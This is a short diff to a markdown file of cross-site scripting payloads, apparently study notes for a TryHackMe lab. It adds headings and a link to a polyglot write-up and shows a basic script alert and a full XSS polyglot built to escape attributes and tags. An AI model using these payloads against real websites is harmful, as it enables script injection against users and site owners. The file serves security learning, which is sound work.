@@ -1,5 +1,5 @@
-
-
+# XSS Payload Bank
+## THM Payloads
 ```javascript
 <script>alert('THM');</script> 
 ```
@@ -44,6 +44,7 @@ An XSS polyglot is a string of text which can escape attributes, tags and bypass
 ```javascript
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 ```
+### A Repository of Polygots
 [Ultimate XSS Polygot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 
 ```javascript
